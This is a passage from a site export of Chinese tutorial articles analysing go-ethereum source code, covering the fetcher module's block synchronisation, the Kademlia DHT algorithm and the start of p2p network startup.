= pm.fetcher.FilterHeaders(p.id, headers, time.Now())\n}\n2.downloader.DeliverHeaders 通知downloader对象\nif len(headers) &gt; 0 || !filter {\n\t\t\terr := pm.downloader.DeliverHeaders(p.id, headers)\n\t\t...\n\t\t}\ndownloader相关的放在接下的文章探讨。继续看FilterHeaders:\nfilter := make(chan *headerFilterTask)\n\tselect {\n\tcase f.headerFilter &lt;- filter: ①\n....\n\tselect {\n\tcase filter &lt;- &amp;headerFilterTask{peer: peer, headers: headers, time: time}: ②\n...\n\tselect {\n\tcase task := &lt;-filter: ③\n\t\treturn task.headers\n...\n\t}\n主要分为3个步骤：\n\n先发一个通信用的 channel 给 headerFilter\n将要过滤的 headerFilterTask 发送给 filter\n检索过滤后剩余的标题\n\n主要的处理步骤还是在loop函数中的filter := &lt;-f.headerFilter，在探讨处理前，先了解三个参数的含义：\n\nunknown：未知的header\nincomplete：header拉取完成，但是body还没有拉取\ncomplete：header和body都拉取完成，一个完整的块，可导入到数据库\n\n接下来正式进入到for _, header := range task.headers {}循环中: 这是第一段重要的循环\n①：判断是否是在fetching中的header，并且不是其他同步算法的header\nif announce := f.fetching[hash]; announce != nil &amp;&amp; announce.origin == task.peer &amp;&amp; f.fetched[hash] == nil &amp;&amp; f.completing[hash] == nil &amp;&amp; f.queued[hash] == nil {\n  .....\n}\n②：如果传递的header与承诺的number不匹配，删除peer\nif header.Number.Uint64() != announce.number {\n  f.dropPeer(announce.origin)\n\t\tf.forgetHash(hash)\n}\n③：判断此区块在本地是否已存在,如果不存在且只有header（空块），直接放入complete以及f.completing中，否则就放入到incomplete中等待同步body。\nif f.getBlock(hash) == nil {\n\t\t\t\t\t\tannounce.header = header\n\t\t\t\t\t\tannounce.time = task.time\n \n\t\t\t\t\t\tif header.TxHash == types.DeriveSha(types.Transactions{}) &amp;&amp; header.UncleHash == types.CalcUncleHash([]*types.Header{}) {\n\t\t\t\t...\n\t\t\t\t\t\t\tblock := types.NewBlockWithHeader(header)\n\t\t\t\t\t\t\tblock.ReceivedAt = task.time\n \n\t\t\t\t\t\t\tcomplete = append(complete, block)\n\t\t\t\t\t\t\tf.completing[hash] = announce\n\t\t\t\t\t\t\tcontinue\n            }\n\t\t\t\t\t\tincomplete = append(incomplete, announce) // 否则添加到需要完成拉取body的列表中\n④：如果f.fetching中不存在此哈希，就放入到unkown中\nelse {\n\t\t\t\t\t// Fetcher doesn&#039;t know about it, add to the return list |fetcher 不认识的放到unkown中\n\t\t\t\t\tunknown = append(unknown, header)\n\t\t\t\t}\n⑤：之后再把Unknown的header再通知fetcher继续过滤\nselect {\n\t\t\tcase filter &lt;- &amp;headerFilterTask{headers: unknown, time: task.time}:\n\t\t\tcase &lt;-f.quit:\n\t\t\t\treturn\n\t\t}\n接着就是进入到第二个循环，要准备拿出incomplete里的哈希，进行同步body的同步\nfor _, announce := range incomplete {\n\t\t\t\thash := announce.header.Hash()\n\t\t\t\tif _, ok := f.completing[hash]; ok {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\tf.fetched[hash] = append(f.fetched[hash], announce)\n\t\t\t\tif len(f.fetched) == 1 {\n\t\t\t\t\tf.rescheduleComplete(completeTimer)\n\t\t\t\t}\n\t\t\t}\n如果f.completing中存在，就表明已经在开始同步body了，直接跳过，否则把这个哈希放入到f.fetched，表示header同步完毕，准备body同步，由f.rescheduleComplete(completeTimer)完成。最后是安排只有header的区块进行导入操作.\nfor _, block := range complete {\n\t\t\t\tif announce := f.completing[block.Hash()]; announce != nil {\n\t\t\t\t\tf.enqueue(announce.origin, block)\n\t\t\t\t}\n\t\t\t}\n重点分析completeTimer.C，同步body的操作，这步完成就是要准备区块导入到数据库流程了。\n拉取body\n进入completeTimer.C，从f.fetched获取哈希，如果本地区块链查不到的话就把这个哈希放入到f.completing中，再循环进行fetchBodies，整个流程就结束了，代码大致如下：\ncase &lt;-completeTimer.C:\n...\n\t\t\tfor hash, announces := range f.fetched {\n\t\t....\n\t\t\t\tif f.getBlock(hash) == nil {\n\t\t\t\t\trequest[announce.origin] = append(request[announce.origin], hash)\n\t\t\t\t\tf.completing[hash] = announce\n\t\t\t\t}\n\t\t\t}\n\t\t\tfor peer, hashes := range request {\n        ...\n\t\t\t\tgo f.completing[hashes[0]].fetchBodies(hashes)\n\t\t\t}\n...\n关键的拉取body函数： p.RequestBodies，发送GetBlockBodiesMsg消息同步body。回到handler里面去查看对应的消息：\ncase msg.Code == GetBlockBodiesMsg:\n\t\t// Decode the retrieval message\n\t\tmsgStream := rlp.NewStream(msg.Payload, uint64(msg.Size))\n\t\tif _, err := msgStream.List(); err != nil {\n\t\t\treturn err\n\t\t}\n\t\tvar (\n\t\t\thash   common.Hash\n\t\t\tbytes  int\n\t\t\tbodies []rlp.RawValue\n\t\t)\n\t\tfor bytes &lt; softResponseLimit &amp;&amp; len(bodies) &lt; downloader.MaxBlockFetch {\n\t\t\t...\n\t\t\tif data := pm.blockchain.GetBodyRLP(hash); len(data) != 0 {\n\t\t\t\tbodies = append(bodies, data)\n\t\t\t\tbytes += len(data)\n\t\t\t}\n\t\t}\n\t\treturn p.SendBlockBodiesRLP(bodies)\nsoftResponseLimit返回的body大小最大为2 * 1024 * 1024,MaxBlockFetch表示每个请求最多128个body。\n之后直接通过GetBodyRLP返回数据通过SendBlockBodiesRLP发回给节点。\n节点将会接收到新消息：BlockBodiesMsg，进入查看：\n// 过滤掉filter请求的body 同步，其他的都交给downloader\n\t\tfilter := len(transactions) &gt; 0 || len(uncles) &gt; 0\n\t\tif filter {\n\t\t\ttransactions, uncles = pm.fetcher.FilterBodies(p.id, transactions, uncles, time.Now())\n\t\t}\n \n\t\tif len(transactions) &gt; 0 || len(uncles) &gt; 0 || !filter {\n\t\t\terr := pm.downloader.DeliverBodies(p.id, transactions, uncles)\n...\n\t\t}\n过滤掉filter请求的body 同步，其他的都交给downloader，downloader部分之后的篇章讲。进入到FilterBodies：\n\tfilter := make(chan *bodyFilterTask)\nselect {\n\tcase f.bodyFilter &lt;- filter:  ①\n\tcase &lt;-f.quit:\n\t\treturn nil, nil\n\t}\n\t// Request the filtering of the body list\n\t// 请求过滤body 列表\n\tselect { ②\n\tcase filter &lt;- &amp;bodyFilterTask{peer: peer, transactions: transactions, uncles: uncles, time: time}:\n\tcase &lt;-f.quit:\n\t\treturn nil, nil\n\t}\n\t// Retrieve the bodies remaining after filtering\n\tselect { ③：\n\tcase task := &lt;-filter:\n\t\treturn task.transactions, task.uncles\n主要分为3个步骤：\n\n先发一个通信用的 channel 给 bodyFilter\n将要过滤的 bodyFilterTask 发送给 filter\n检索过滤后剩余的body\n\n现在进入到case filter := &lt;-f.bodyFilter里面，大致做了以下几件事：\n①：首先从f.completing中获取要同步body的哈希\nfor i := 0; i &lt; len(task.transactions) &amp;&amp; i &lt; len(task.uncles); i++ {\n  for hash, announce := range f.completing {\n    ...\n  }\n}\n②：然后从f.queued去查这个哈希是不是已经获取了body，如果没有并满足条件就创建一个完整block\nif f.queued[hash] == nil {\n\t\t\t\t\t\ttxnHash := types.DeriveSha(types.Transactions(task.transactions[i]))\n\t\t\t\t\t\tuncleHash := types.CalcUncleHash(task.uncles[i])\n  if txnHash == announce.header.TxHash &amp;&amp; uncleHash == announce.header.UncleHash &amp;&amp; announce.origin == task.peer {\n\t\t\t\t\t\t\tmatched = true\n \n\t\t\t\t\t\t\tif f.getBlock(hash) == nil {\n\t\t\t\t\t\t\t\tblock := types.NewBlockWithHeader(announce.header).WithBody(task.transactions[i], task.uncles[i])\n\t\t\t\t\t\t\t\tblock.ReceivedAt = task.time\n \n                blocks = append(blocks, block)\n              }\n  }\n③：最后对完整的块进行导入\nfor _, block := range blocks {\n\t\t\t\tif announce := f.completing[block.Hash()]; announce != nil {\n\t\t\t\t\tf.enqueue(announce.origin, block)\n\t\t\t\t}\n\t\t\t}\n最后用一张粗略的图来大概的描述一下整个同步区块哈希的流程：\n\n\n同步区块哈希的最终会走到f.enqueue里面，这个也是同步区块最重要的要做的一件事，下文就会讲到。\nFetcher 同步区块\n分析完上面比较复杂的同步区块哈希过程，接下来就要分析比较简单的同步区块过程。从NewBlockMsg开始：\n主要做两件事：\n①：fetcher模块导入远程节点发过来的区块\npm.fetcher.Enqueue(p.id, request.Block)\n②：主动同步远程节点\nif _, td := p.Head(); trueTD.Cmp(td) &gt; 0 {\n\t\t\tp.SetHead(trueHead, trueTD)\n\t\t\tcurrentBlock := pm.blockchain.CurrentBlock()\n\t\t\tif trueTD.Cmp(pm.blockchain.GetTd(currentBlock.Hash(), currentBlock.NumberU64())) &gt; 0 {\n\t\t\t\tgo pm.synchronise(p)\n\t\t\t}\n\t\t}\n主动同步由Downloader去处理，我们这篇只讨论fetcher相关。\n区块入队列\npm.fetcher.Enqueue(p.id, request.Block)\ncase op := &lt;-f.inject:\n\t\t\tpropBroadcastInMeter.Mark(1)\n\t\t\tf.enqueue(op.origin, op.block)\n正式进入将区块送进queue中，主要做了以下几件事：\n①： 确保新加peer没有导致DOS攻击\ncount := f.queues[peer] + 1\n\tif count &gt; blockLimit {\n\t\tlog.Debug(&quot;Discarded propagated block, exceeded allowance&quot;, &quot;peer&quot;, peer, &quot;number&quot;, block.Number(), &quot;hash&quot;, hash, &quot;limit&quot;, blockLimit)\n\t\tpropBroadcastDOSMeter.Mark(1)\n\t\tf.forgetHash(hash)\n\t\treturn\n\t}\n②：丢弃掉过去的和比较老的区块\nif dist := int64(block.NumberU64()) - int64(f.chainHeight()); dist &lt; -maxUncleDist || dist &gt; maxQueueDist {\n  f.forgetHash(hash)\n}\n③：安排区块导入\n\tif _, ok := f.queued[hash]; !ok {\n\t\top := &amp;inject{\n\t\t\torigin: peer,\n\t\t\tblock:  block,\n\t\t}\n\t\tf.queues[peer] = count\n\t\tf.queued[hash] = op\n\t\tf.queue.Push(op, -int64(block.NumberU64()))\n\t\tif f.queueChangeHook != nil {\n\t\t\tf.queueChangeHook(op.block.Hash(), true)\n\t\t}\n\t\tlog.Debug(&quot;Queued propagated block&quot;, &quot;peer&quot;, peer, &quot;number&quot;, block.Number(), &quot;hash&quot;, hash, &quot;queued&quot;, f.queue.Size())\n\t}\n到此为止，已经将区块送入到queue中，接下来就是要回到loop函数中去处理queue中的区块。\n区块入库\nloop函数在处理队列中的区块主要做了以下事情：\n\n判断队列是否为空\n取出区块哈希，并且和本地链进行比较，如果太高的话，就暂时不导入\n最后通过f.insert将区块插入到数据库。\n\n代码如下：\nheight := f.chainHeight()\n\t\tfor !f.queue.Empty() {\n\t\t\top := f.queue.PopItem().(*inject)\n\t\t\thash := op.block.Hash()\n\t\t...\n\t\t\tnumber := op.block.NumberU64()\n\t\t\tif number &gt; height+1 {\n\t\t\t\tf.queue.Push(op, -int64(number))\n\t...\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tif number+maxUncleDist &lt; height || f.getBlock(hash) != nil {\n\t\t\t\tf.forgetBlock(hash)\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tf.insert(op.origin, op.block) //导入块\n\t\t}\n进入到f.insert中，主要做了以下几件事：\n①：判断区块的父块是否存在，不存在则中断插入\n\t\tparent := f.getBlock(block.ParentHash())\n\t\tif parent == nil {\n\t\t\tlog.Debug(&quot;Unknown parent of propagated block&quot;, &quot;peer&quot;, peer, &quot;number&quot;, block.Number(), &quot;hash&quot;, hash, &quot;parent&quot;, block.ParentHash())\n\t\t\treturn\n\t\t}\n②： 快速验证header，并在传递时广播该块\nswitch err := f.verifyHeader(block.Header()); err {\n\t\tcase nil:\n\t\t\tpropBroadcastOutTimer.UpdateSince(block.ReceivedAt)\n\t\t\tgo f.broadcastBlock(block, true)\n③：运行真正的插入逻辑\nif _, err := f.insertChain(types.Blocks{block}); err != nil {\n\t\t\tlog.Debug(&quot;Propagated block import failed&quot;, &quot;peer&quot;, peer, &quot;number&quot;, block.Number(), &quot;hash&quot;, hash, &quot;err&quot;, err)\n\t\t\treturn\n\t\t}\n④：导入成功广播此块\ngo f.broadcastBlock(block, false)\n真正做区块入库的是f.insertChain，这里会调用blockchain模块去操作，具体细节会后续文章讲述，到此为止Fether模块的同步就到此结束了，下面是同步区块的流程图：\n\n\n参考\n\nmindcarver.cn\ngithub.com/blockchainGuide\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/死磕以太坊源码分析之Kademlia算法-2":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/死磕以太坊源码分析之Kademlia算法-2","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/死磕以太坊源码分析之Kademlia算法-2.md","title":"死磕以太坊源码分析之Kademlia算法-2","links":[],"tags":[],"content":"\n死磕以太坊源码分析之Kademlia算法\n\nKAD 算法概述\nKademlia是一种点对点分布式哈希表（DHT），它在容易出错的环境中也具有可证明的一致性和性能。使用一种基于异或指标的拓扑结构来路由查询和定位节点，这简化了算法并有助于证明。该拓扑结构有一个特点：每次消息交换都能够传递或强化有效信息。系统利用这些信息进行并发的异步查询，可以容忍节点故障，并且故障不会导致用户超时。\nKAD算法要处理的问题\n\n如何分配存储内容到各个节点，新增/删除内容如何处理\n如何找到存储文件的节点/地址/路径\n\n节点状态\n节点的基本属性包括如下：\n\n\n节点ID，Node ID\n节点IP地址与端口号\n\n\n在 Kad 网络中，所有节点都被当作一颗二叉树的叶子，并且每一个节点的位置都由其 ID 值的最短前缀唯一的确定。\n对于任意一个节点，都可以把这颗二叉树分解为一系列连续的，不包含自己的子树。最高层的子树，由整颗树不包含自己的树的另一半组成；下一层子树由剩下部分不包含自己的一半组成；依此类推，直到分割完整颗树。图 1 就展示了节点0011如何进行子树的划分：\n\n虚线包含的部分就是各子树，由上到下各层的前缀分别为0，01，000，0010。\nKad 协议确保每个节点知道其各子树的至少一个节点，只要这些子树非空。在这个前提下，每个节点都可以通过ID值来找到任何一个节点。这个路由的过程是通过所谓的 XOR（异或）距离得到的。\n图 2 就演示了节点0011如何通过连续查询来找到节点1110的。节点0011通过在逐步底层的子树间不断学习并查询最佳节点，获得了越来越接近的节点，最终收敛到目标节点上。\n\n需要说明的是:只有第一步查询的节点101，是节点0011已经知道的，后面各步查询的节点，都是由上一步查询返回的更接近目标的节点，这是一个递归操作的过程。\n\n节点距离\nKad 网络中每个节点都有一个 160 bit 的 ID 值作为标志符，Key 也是一个 160 bit 的标志符，每一个加入 Kad 网络的计算机都会在 160 bit 的 key 空间被分配一个节点 ID（node ID）值（可以认为 ID 是随机产生的）， &lt;key,value&gt; 对的数据就存放在 ID 值“最”接近 key 值的节点上。\n判断两个节点 x,y 的距离远近是基于数学上的异或的二进制运算， d(x,y)=x⊕y ，既对应位相同时结果为0，不同时结果为1。例如：\n    010101\nXOR 110001\n----------\n    100100\n\n则这两个节点的距离为 32+4=36 。\n显然，高位上数值的差异对结果的影响更大。\n对于异或操作，有如下一些数学性质：\n\n两个节点间的距离是随机的\n节点与自身的距离是0\n对称性。A 到 B 的距离和 B 到 A 的距离相等\n三角不等。distance(A,B)+distance(B,C) ⇐ distance(A,C)\n\n对于任意给定的节点 x 和距离 Δ≥0 ，总会存在一个精确的节点 y ，使得 d(x,y)=Δ 。另外，单向性也确保了对于同一个 key 值的所有查询都会逐步收敛到同一个路径上，而不管查询的起始节点位置如何。这样，只要沿着查询路径上的节点都缓存这个 &lt;key,value&gt; 对，就可以减轻存放热门 key 值节点的压力，同时也能够加快查询响应速度。\nK桶\nK 桶的概念\nKad 的路由表是通过一些称之为 K 桶的表格构造起来的。\n对每一个 0≤i≤160 ，每个节点都保存有一些和自己距离范围在区间 [2^i^,2^i+1^) 内的一些节点信息，这些信息由一些 (IP address,UDP port,Node ID) 数据列表构成（Kad 网络是靠 UDP 协议交换信息的）。每一个这样的列表都称之为一个 K 桶，并且每个 K 桶内部信息存放位置是根据上次看到的时间顺序排列，最近（ least-recently）看到的放在头部，最后（most-recently）看到的放在尾部。每个桶都有不超过 k 个的数据项。\n一个节点的全部 K 桶列表如下图 所示：\n\n当 i 值很小时，K 桶通常是空的（也就是说没有足够多的节点，比如当 i = 0 时，就最多可能只有1项）；而当 i 值很大时，其对应 K 桶的项数又很可能会超过 k 个（当然，覆盖距离范围越广，存在较多节点的可能性也就越大），这里 k 是为平衡系统性能和网络负载而设置的一个常数，但必须是偶数，比如 k = 20。在 BitTorrent 的实现中，取值为 k = 8。\n由于每个 K 桶覆盖距离的范围呈指数关系增长，这就形成了离自己近的节点的信息多，离自己远的节点的信息少，从而可以保证路由查询过程是收敛。因为是用指数方式划分区间，经过证明，对于一个有 N 个节点的 Kad 网络，最多只需要经过 logN 步查询，就可以准确定位到目标节点。\nK桶更新机制\n当节点 x 收到一个 PRC 消息时，发送者 y 的 IP 地址就被用来更新对应的 K 桶，具体步骤如下：\n\n计算自己和发送者的距离： d(x,y)=x⊕y ，注意：x 和 y 是 ID 值，不是 IP 地址\n通过距离 d 选择对应的 K 桶进行更新操作\n如果 y 的 IP 地址已经存在于这个 K 桶中，则把对应项移到该该 K 桶的尾部\n如果 y 的 IP 地址没有记录在该 K 桶中\n\n如果该 K 桶的记录项小于 k 个，则直接把 y 的 (IP address, UDP port, Node ID) 信息插入队列尾部\n如果该 K 桶的记录项大于 k 个，则选择头部的记录项（假如是节点 z）进行 RPC_PING 操作\n\n如果 z 没有响应，则从 K 桶中移除 z 的信息，并把 y 的信息插入队列尾部\n如果 z 有响应，则把 z 的信息移到队列尾部，同时忽略 y 的信息\n\n\n\n\n\nK 桶的更新机制非常高效的实现了一种把最近看到的节点更新的策略，除非在线节点一直未从 K 桶中移出过。也就是说在线时间长的节点具有较高的可能性继续保留在 K 桶列表中。\n所以，通过把在线时间长的节点留在 K 桶里，Kad 就明显增加 K 桶中的节点在下一时间段仍然在线的概率，这**对应 Kad 网络的稳定性和减少网络维护成本（不需要频繁构建节点的路由表）**带来很大好处。\n这种机制的另一个好处是能在一定程度上防御 DOS 攻击，因为只有当老节点失效后，Kad 才会更新 K 桶的信息，这就避免了通过新节点的加入来泛洪路由信息。\n为了防止 K 桶老化，所有在一定时间之内无更新操作的 K 桶，都会分别从自己的 K 桶中随机选择一些节点执行 RPC_PING 操作。\n上述这些 K 桶机制使 Kad 缓和了流量瓶颈（所有节点不会同时进行大量的更新操作），同时也能对节点的失效进行迅速响应。\n\n协议消息\nKademlia 协议包括四种远程 RPC 操作：PING、STORE、FIND_NODE、FIND_VALUE。\n\n\nPING 操作的作用是探测一个节点，用以判断其是否仍然在线。\n\n\nSTORE 操作的作用是通知一个节点存储一个 &lt;key,value&gt; 对，以便以后查询需要。\n\n\nFIND_NODE 操作使用一个 160 bit 的 ID 作为参数。本操作的接受者返回它所知道的更接近目标 ID 的 K 个节点的 (IP address, UDP port, Node ID) 信息。\n这些节点的信息可以是从一个单独的 K 桶获得，也可以从多个 K 桶获得（如果最接近目标 ID 的 K 桶未满）。不管是哪种情况，接受者都将返回 K 个节点的信息给操作发起者。但如果接受者所有 K 桶的节点信息加起来也没有 K 个，则它会返回全部节点的信息给发起者。\n\n\nFIND_VALUE 操作和 FIND_NODE 操作类似，不同的是它只需要返回一个节点的 (IP address, UDP port, Node ID) 信息。如果本操作的接受者收到同一个 key 的 STORE 操作，则会直接返回存储的 value 值。\n注：在 Kad 网络中，系统存储的数据以 &lt;key,value&gt; 对形式存放。根据笔者的分析，在 BitSpirit 的 DHT 实现中，其 key 值为 torrent 文件的 info_hash 串，其 value 值则和 torrent 文件有密切关系。\n\n\n为了防止伪造地址，在所有 RPC 操作中，接受者都需要响应一个随机的 160 bit 的 ID 值。另外，为了确信发送者的网络地址，PING 操作还可以附带在接受者的 RPC 回复信息中（在上述 4种操作中 接受者回复 发送者时，可以携带上 接受者对 发送者的 PING, 以此校验 发送者是否还健在）。\n\n路由查找\nKad 技术的最大特点之一就是能够提供快速的节点查找机制，并且还可以通过参数进行查找速度的调节。\n假如节点 x 要查找 ID 值为 t 的节点，Kad 按照如下递归操作步骤进行路由查找：\n\n计算到 t 的距离： d(x,y)=x⊕y\n从 x 的第 [logd] 个 K 桶中取出 α 个节点的信息（“[”“]”是取整符号），同时进行 FIND_NODE 操作。如果这个 K 桶中的信息少于 α 个，则从附近多个桶中选择距离最接近 d 的总共 α 个节点。\n对接受到查询操作的每个节点，如果发现自己就是 t，则回答自己是最接近 t 的；否则测量自己和 t 的距离，并从自己对应的 K 桶中选择 α 个节点的信息给 x。\nX 对新接受到的每个节点都再次执行 FIND_NODE 操作，此过程不断重复执行，直到每一个分支都有节点响应自己是最接近 t 的。\n通过上述查找操作，x 得到了 k 个最接近 t 的节点信息。\n\n注意：这里用“最接近”这个说法，是因为 ID 值为 t 的节点不一定存在网络中，也就是说 t 没有分配给任何一台电脑。\n这里 α 也是为系统优化而设立的一个参数，就像 K 一样。在 BitTorrent 实现中，取值为 α=3 。\n当 α=1 时，查询过程就类似于 Chord 的逐跳查询过程，如图 4。\n\n整个路由查询过程是递归操作的，其过程可用数学公式表示为：\n\nN0=x (即查询操作的发起者)\nN1=find ⎯noden0(t)\nN2=find ⎯noden1(t)\n… …\nNl=find ⎯nodenl−1(t)\n\n这个递归过程一直持续到 Nl=t ，或者 Nl 的路由表中没有任何关于 t 的信息，即查询失败。\n由于每次查询都能从更接近 t 的 K 桶中获取信息，这样的机制保证了每一次递归操作都能够至少获得距离减半（或距离减少 1 bit）的效果，从而保证整个查询过程的收敛速度为 O(logN) ，这里 N 为网络全部节点的数量。\n当节点 x 要查询 &lt;key,value&gt; 对时，和查找节点的操作类似，x 选择 k 个 ID 值最接近 key 值的节点，执行 FIND_VALUE 操作，并对每一个返回的新节点重复执行 FIND_VALUE 操作，直到某个节点返回 value 值。\n一旦 FIND_VALUE 操作成功执行，则 &lt;key,value&gt; 对数据会缓存在没有返回 value 值的最接近的节点上。这样下一次查询相同的 key 时就会更加快速的得到结果。通过这样的方式，热门 &lt;key,value&gt; 对数据的缓存范围就逐步扩大，使系统具有极佳的响应速度( cache 为存活24小时，但是目标节点上的内容时每1小时向其他最近节点重新发布&lt;key, value&gt;使得数据的超时时间得以刷新，而远离目标节点的节点的数据存活时间当然就可能不会被重新发布到，所以也就是数据缓存的超时时间和节点的距离成反比)\n\n数据存储\n存放 &lt;key,value&gt; 对数据的过程为：\n\n发起者首先定位 k 个 ID 值最接近 key 的节点\n发起者对这 k 个节点发起 STORE 操作\n执行 STORE 操作的 k 个节点每小时重发布自己所有的 &lt;key,value&gt; 对数据\n为了限制失效信息，所有 &lt;key,value&gt; 对数据在初始发布24小时后过期\n\n另外，为了保证数据发布、搜寻的一致性，规定在任何时候，当节点 w 发现新节点 u 比 w 上的某些 &lt;key,value&gt; 对数据更接近，则 w 把这些 &lt;key,value&gt; 对数据复制到 u 上，但是并不会从 w 上删除。\n\n节点的加入和离开\n如果节点 u 要想加入 Kad 网络，它必须要和一个已经在 Kad 网络的节点，比如 w，取得联系。\nu 首先把 w 插入自己适当的 K 桶中，然后对自己的节点 ID 执行一次 FIND_NODE 操作 (向 w 发布 查找 u 的 FIND_NODE 请求)，然后根据接收到的信息更新自己的 K 桶内容。通过对自己邻近节点由近及远的逐步查询，u 完成了仍然是空的 K 桶信息的构建，同时也把自己的信息发布到其他节点的 K 桶中。\n节点 u 为例，其路由表的生成过程为：\n\n最初，u 的路由表为一个单个的 K 桶，覆盖了整个 160 bit ID 空间，如图 6 最上面的路由表；\n当学习到新的节点信息后，则 u 会尝试把新节点的信息，根据其前缀值插入到对应的 K 桶中：\n\n如果该 K 桶没有满，则新节点直接插入到这个 K 桶中；\n如果该 K 桶已经满了，\n\n如果该 K 桶覆盖范围包含了节点 u 的 ID，则把该 K 桶分裂为两个大小相同的新 K 桶，并对原 K 桶内的节点信息按照新的 K 桶前缀值进行重新分配\n如果该 K 桶覆盖范围没有包节点 u 的 ID，则直接丢弃该新节点信息\n\n\n\n\n上述过程不断重复，最终会形成表 1 结构的路由表。达到距离近的节点的信息多，距离远的节点的信息少的结果，保证了路由查询过程能快速收敛。\n\n\n在图 7 中，演示了当覆盖范围包含自己 ID 值的 K 桶是如何逐步分裂的。\n\n当 K 桶 010 满了之后，由于其覆盖范围包含了节点 0100 的 ID，故该 K 桶分裂为两个新的 K 桶：0101 和 0100，原 K 桶 010 的信息会根据其其前缀值重新分布到这两个新的 K 桶中。注意，这里并没有使用 160 bit 的 ID 值表示法，只是为了方便原理的演示，实际 Kad 网络中的 ID 值都是 160 bit 的。\n节点离开 Kad 网络不需要发布任何信息，Kademlia 协议的目标之一就是能够弹性工作在任意节点随时失效的情况下。为此，Kad 要求每个节点必须周期性 【一般是： 每小时】 的发布全部自己存放的 &lt;key,value&gt; 对数据，并把这些数据缓存在自己的 k 个最近邻居处，这样存放在失效节点的数据会很快被更新到其他新节点上。所以有节点离开了，那么就离开了，而且节点中的k-桶刷新机制也能保证会把已经不在线的节点信息从自己本地k-桶中移除\n\n参考\n\n公众号：区块链技术栈\n文章及所有资料：github.com/blockchainGuide/\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/死磕以太坊源码分析之p2p网络启动-1":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/死磕以太坊源码分析之p2p网络启动-1","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/p2p/死磕以太坊源码分析之p2p网络启动-1.md","title":"死磕以太坊源码分析之p2p网络启动-1","links":[],"tags":[],"content":"\n死磕以太坊源码分析之p2p网络启动\n资料代码及文章:github.com/blockchainGuide/\n持续输出区块链相关技术文章，喜欢作者可以持续关注，文章有问题，可以随时指出。\n\np2p源码目录\ndiscover/          基于UDP的节点发现V4协议\n  discv5/            节点发现V5协议\n  enode/             节点信息\n  enr/               以太坊节点记录（ethereum node records)\n  nat/               网络地址转换，用于内网穿透\n  netutil/\n  protocol/\n  simulations/       本地p2p网络的模拟器\n  dial.go            建立连接请求，以任务的形式 \n  message.go         定义了读写的接口\n  metrics.go         计时器和计量器工具\n  peer.go            节点\n  protocol.go        子协议\n  rlpx.go            加密传输协议 \n  server.go          底层p2p网络的函数入口 \n\n启动p2p网络\n启动p2p网络主要会做以下几件事：\n\n发现远程节点，建立相邻节点列表\n监听远程节点发过来的建立TCP请求\n向远程节点发送建立TCP连接请求\n\n首先找到p2p网络启动的入口：\nStart()\nstart函数主要做了以下6件事：\n\n初始化server的字段\n设置本地节点setupLocalNode\n设置监听TCP连接请求setupListening\n设置节点发现（setupDiscovery）V4版本\n设置最大可以主动发起的连接为50/3\nsrv.run(dialer) 发起建立TCP连接请求\n\n其中setupLocalNode、setupListening、setupDiscovery、newDialState、srv.run(dialer)是我们要重点分析的函数。\n设置本地节点\n进入到setupLocalNode中：\n①：创建devp2p握手\npubkey := crypto.FromECDSAPub(&amp;srv.PrivateKey.PublicKey)\n\tsrv.ourHandshake = &amp;protoHandshake{Version: baseProtocolVersion, Name: srv.Name, ID: pubkey[1:]}\n\tfor _, p := range srv.Protocols {\n\t\tsrv.ourHandshake.Caps = append(srv.ourHandshake.Caps, p.cap())\n\t}\nsort.Sort(capsByNameAndVersion(srv.ourHandshake.Caps))\n握手协议包括协议版本号，节点名称和节点的公钥，存入到Caps中要根据名称和协议排序。\n②：创建本地节点\ndb, err := enode.OpenDB(srv.Config.NodeDatabase)\n\tif err != nil {\n\t\treturn err\n\t}\n\tsrv.nodedb = db\n\tsrv.localnode = enode.NewLocalNode(db, srv.PrivateKey)\n\tsrv.localnode.SetFallbackIP(net.IP{127, 0, 0, 1})\n\t// TODO: check conflicts\n\tfor _, p := range srv.Protocols {\n\t\tfor _, e := range p.Attributes {\n\t\t\tsrv.localnode.Set(e)\n\t\t}\n\t}\n首先从节点数据库中去获取节点信息，如果不存在则新建本地节点并设置默认IP，同时将节点记录的协议特定信息存入到本地节点中。\n\n设置监听\n进入到setupListening:\n①：启动监听器\n②：如果配置了NAT，则更新本地节点记录并映射TCP监听端口\nif tcp, ok := listener.Addr().(*net.TCPAddr); ok {\n\t\tsrv.localnode.Set(enr.TCP(tcp.Port))\n\t\tif !tcp.IP.IsLoopback() &amp;&amp; srv.NAT != nil {\n\t\t\tsrv.loopWG.Add(1)\n\t\t\tgo func() {\n\t\t\t\tnat.Map(srv.NAT, srv.quit, &quot;tcp&quot;, tcp.Port, tcp.Port, &quot;ethereum p2p&quot;)\n\t\t\t\tsrv.loopWG.Done()\n\t\t\t}()\n\t\t}\n\t}\n③：开启P2P监听，接收inbound连接\nsrv.listenLoop()\n这个函数需要进一步分析：\n主要有以下逻辑：\n\n\n首先defaultMaxPendingPeers这个字段指的是inbound 和outbound连接，默认最大值为50\n\n\n将监听的连接返回给listener\nfd, err = srv.listener.Accept()\n\n\n获取监听的连接的地址并检查这个连接\nremoteIP := netutil.AddrIP(fd.RemoteAddr())\nif err := srv.checkInboundConn(fd, remoteIP); err != nil {\n  .....\n}\ncheckInboundConn主要是做了以下的判断：\n\n拒绝不符合NetRestrict的连接（NetRestrict是指已经限定了某些连接，除此之外会拒绝）\n拒绝尝试过多的节点\n\n\n\n最后真正建立连接\ngo func() {\n\t\t\tsrv.SetupConn(fd, inboundConn, nil)// 连接建立过程（将连接添加为peer）\n\t\t\tslots &lt;- struct{}{}\n\t\t}()\n要注意setupConn的第三个字段传入的是nil，表示还没有拨号，如果正在拨号的话需要节点公钥。\nvar dialPubkey *ecdsa.PublicKey\n\tif dialDest != nil {\n\t\tdialPubkey = new(ecdsa.PublicKey)\n\t\tif err := dialDest.Load((*enode.Secp256k1)(dialPubkey)); err != nil {\n\t\t\treturn errors.New(&quot;dial destination doesn&#039;t have a secp256k1 